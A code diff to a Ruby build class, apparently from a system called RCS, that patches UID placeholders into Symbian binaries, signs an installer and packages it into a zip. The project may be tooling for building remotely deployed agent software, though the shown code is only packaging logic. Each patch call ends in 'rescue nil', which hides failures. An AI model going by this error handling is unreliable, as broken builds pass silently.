@@ -4,6 +4,7 @@
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/binary'
 
 require 'yaml'
 require 'find'
@@ -49,7 +50,7 @@ class BuildSymbian < Build
   def sign(params)
     trace :debug, "Build: signing: #{params}"
 
-    yaml = File.open(Config.instance.cert("symbian.yaml"), 'r') {|f| f.read}
+    yaml = File.open(Config.instance.cert("symbian.yaml"), 'rb') {|f| f.read}
     uids = YAML.load(yaml)
 
     # the UIDS must be 8 chars (padded with zeros)
@@ -61,13 +62,13 @@ class BuildSymbian < Build
     Find.find(@tmpdir).each do |file|
       if File.file?(file)
         content = File.open(file, 'rb') {|f| f.read}
-        content.gsub! '[:UID1:]', uids[0]
-        content.gsub! '[:UID2:]', uids[1]
-        content.gsub! '[:UID3:]', uids[2]
-        content.gsub! '[:UID4:]', uids[3]
-        content.gsub! '[:UID5:]', uids[4]
-        content.gsub! '[:UID6:]', uids[5]
-        content.gsub! /SharedQueueCli_20023633\{000a0000\}\[[a-z0-9]*\].dll/, "SharedQueueCli_20023633{000a0000}[#{uids[3]}].dll"
+        content.binary_patch '[:UID1:]', uids[0] rescue nil
+        content.binary_patch '[:UID2:]', uids[1] rescue nil
+        content.binary_patch '[:UID3:]', uids[2] rescue nil
+        content.binary_patch '[:UID4:]', uids[3] rescue nil
+        content.binary_patch '[:UID5:]', uids[4] rescue nil
+        content.binary_patch '[:UID6:]', uids[5] rescue nil
+        content.binary_patch /SharedQueueCli_20023633\{000a0000\}\[[a-z0-9]*\].dll/, "SharedQueueCli_20023633{000a0000}[#{uids[3]}].dll" rescue nil
         File.open(file, 'wb') {|f| f.write content}
       end
     end
@@ -125,7 +126,7 @@ class BuildSymbian < Build
     CrossPlatform.exec path('signsis'), "-s installer.sis #{@appname}.sisx symbian.cer symbian.key", {chdir: path('')}
     File.exist? path(@appname + '.sisx') or raise("signsis failed for installer")
 
-    @outputs << ['installer.sis', @appname + '.sisx']
+    @outputs += ['installer.sis', @appname + '.sisx']
     
   end
 
@@ -133,7 +134,7 @@ class BuildSymbian < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname + '.sisx', "w") { |f| f.write File.open(path(@appname + '.sisx'), 'rb') {|f| f.read} }
+      z.file.open(@appname + '.sisx', "wb") { |f| f.write File.open(path(@appname + '.sisx'), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
